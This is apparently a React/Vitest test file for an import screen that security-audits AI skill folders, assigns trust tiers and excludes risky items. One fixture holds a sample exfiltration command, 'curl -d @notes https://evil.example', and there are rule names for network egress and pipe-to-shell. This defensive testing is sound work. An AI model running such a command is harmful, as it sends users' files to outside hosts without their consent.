import { mockIPC } from "@tauri-apps/api/mocks";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter, Route, Routes } from "react-router";
import { describe, expect, it } from "vitest";
import type { Candidate } from "../../bindings/Candidate";
import type { Finding } from "../../bindings/Finding";
import type { Preview } from "../../bindings/Preview";
import type { Tier } from "../../bindings/Tier";
import { ImportScreen } from ".";

function finding(over: Partial<Finding>): Finding {
  return {
    rule: "r",
    severity: "low",
    message: "m",
    file: "f.md",
    line: null,
    evidence: "",
    ...over,
  };
}

function cand(
  name: string,
  tier: Tier,
  score: number,
  findings: Finding[] = [],
  reach: Partial<Candidate["audit"]["reach"]> = {},
): Candidate {
  return {
    id: `id-${name}`,
    artifact: {
      kind: "skill",
      name,
      description: null,
      path: `skills/${name}`,
      files: [],
      metadata: {},
      references: [],
      diagnostics: [],
      digest: null,
      origin: { type: "own" },
    },
    alreadyInLibrary: false,
    replacedSecretKeys: [],
    suggestedTags: [],
    copies: [],
    audit: {
      score,
      tier,
      findings,
      reach: { files: [], network: [], shell: [], env: [], ...reach },
    },
  } as Candidate;
}

const preview = (extra: Candidate[] = []): Preview => ({
  source: { kind: "local", path: "/home/me/.claude" },
  diagnostics: [],
  candidates: [
    cand("calm", "trusted", 100),
    cand(
      "fetcher",
      "risky",
      55,
      [
        finding({
          rule: "network-egress",
          severity: "high",
          message: "Posts data to a remote host.",
          file: "skills/fetcher/SKILL.md",
          line: 12,
          evidence: "curl -d @notes https://evil.example",
        }),
      ],
      { network: ["evil.example"], shell: ["curl"] },
    ),
    cand("pipe", "dangerous", 5, [
      finding({
        rule: "pipe-to-shell",
        severity: "critical",
        message: "Pipes a download into sh.",
      }),
    ]),
    ...extra,
  ],
});

function setup(previews: Preview[]) {
  let n = 0;
  mockIPC((cmd) => {
    switch (cmd) {
      case "home_claude_dir":
        return "/home/me/.claude";
      case "library_preview":
        return previews[Math.min(n++, previews.length - 1)];
      case "tags_list":
        return [];
      default:
        return null;
    }
  });
  render(
    <MemoryRouter initialEntries={["/import"]}>
      <Routes>
        <Route path="/import" element={<ImportScreen />} />
      </Routes>
    </MemoryRouter>,
  );
}

async function toChoose(u: ReturnType<typeof userEvent.setup>) {
  await u.click(screen.getByRole("button", { name: "Continue" }));
  await screen.findByText(/Found \d+ artifacts/);
}

describe("Import audit", () => {
  it("labels each row with its tier and score", async () => {
    const u = userEvent.setup();
    setup([preview()]);
    await toChoose(u);
    const skills = screen.getByRole("region", { name: /^Skills/ });
    const trusted = within(skills).getByText("Trusted");
    expect(trusted.closest("span")).toHaveAttribute("data-tier", "trusted");
    expect(within(trusted).getByText("100")).toBeInTheDocument();
    expect(within(skills).getByText("Risky")).toHaveAttribute(
      "data-tier",
      "risky",
    );
  });

  it("starts a critical candidate excluded with its reason, and restores it", async () => {
    const u = userEvent.setup();
    setup([preview()]);
    await toChoose(u);
    expect(screen.getByText("2 to import, 1 excluded")).toBeInTheDocument();
    const gone = screen.getByRole("region", { name: "Excluded, 1" });
    expect(within(gone).getByText("pipe")).toBeInTheDocument();
    expect(
      within(gone).getByText("Critical finding: pipe-to-shell"),
    ).toBeInTheDocument();
    await u.click(screen.getByRole("button", { name: "Restore pipe" }));
    expect(screen.getByText("3 to import, 0 excluded")).toBeInTheDocument();
  });

  it("lists audit findings apart from scan diagnostics when a row expands", async () => {
    const u = userEvent.setup();
    setup([preview()]);
    await toChoose(u);
    await u.click(
      screen.getByRole("button", { name: "Show diagnostics of fetcher" }),
    );
    expect(screen.getByText("Security audit")).toBeInTheDocument();
    const list = screen.getByRole("list", {
      name: "Audit findings of fetcher",
    });
    expect(within(list).getByText("high")).toBeInTheDocument();
    expect(within(list).getByText("network-egress")).toBeInTheDocument();
    expect(
      within(list).getByText("skills/fetcher/SKILL.md:12"),
    ).toBeInTheDocument();
    expect(
      within(list).getByText("curl -d @notes https://evil.example"),
    ).toBeInTheDocument();
  });

  it("excludes Risky and Dangerous in one action", async () => {
    const u = userEvent.setup();
    setup([preview()]);
    await toChoose(u);
    await u.click(
      screen.getByRole("button", { name: "Exclude Risky and Dangerous" }),
    );
    expect(screen.getByText("1 to import, 2 excluded")).toBeInTheDocument();
  });

  it("keeps the user's restores when Include them re-previews", async () => {
    const u = userEvent.setup();
    const first = {
      ...preview(),
      diagnostics: [
        {
          severity: "info",
          code: "scan.managed-skipped",
          message: "3 skill folders not scanned",
          file: "",
        },
      ],
    } as Preview;
    const second = preview([
      cand("managed-bad", "dangerous", 0, [
        finding({ rule: "pipe-to-shell", severity: "critical" }),
      ]),
    ]);
    setup([first, second]);
    await toChoose(u);
    await u.click(screen.getByRole("button", { name: "Restore pipe" }));
    const include = screen.getByRole("button", { name: "Include them" });
    await u.click(include);
    await waitFor(() =>
      expect(screen.getByText("3 to import, 1 excluded")).toBeInTheDocument(),
    );
    const gone = screen.getByRole("region", { name: "Excluded, 1" });
    expect(within(gone).getByText("managed-bad")).toBeInTheDocument();
  });

  it("summarises the audit on Review", async () => {
    const u = userEvent.setup();
    setup([preview()]);
    await toChoose(u);
    await u.click(screen.getByRole("button", { name: "Continue" }));
    const audit = screen.getByRole("region", { name: "Security audit" });
    const tiers = within(audit).getByRole("list", {
      name: "Artifacts per tier",
    });
    expect(tiers.children[0]).toHaveTextContent("1 Trusted");
    expect(tiers.children[1]).toHaveTextContent("0 Review");
    expect(tiers.children[2]).toHaveTextContent("1 Risky");
    expect(tiers.children[3]).toHaveTextContent("0 Dangerous");
    expect(
      within(audit).getByLabelText("Findings per severity"),
    ).toHaveTextContent("1 finding: 1 high");
    const reach = within(audit).getByRole("list", { name: "Reach of fetcher" });
    expect(reach).toHaveTextContent("evil.example");
    expect(reach).toHaveTextContent("curl");
    const flagged = within(audit).getByText("Flagged").nextElementSibling;
    expect(flagged).toHaveTextContent("fetcher");
    expect(flagged).not.toHaveTextContent("calm");
  });
});
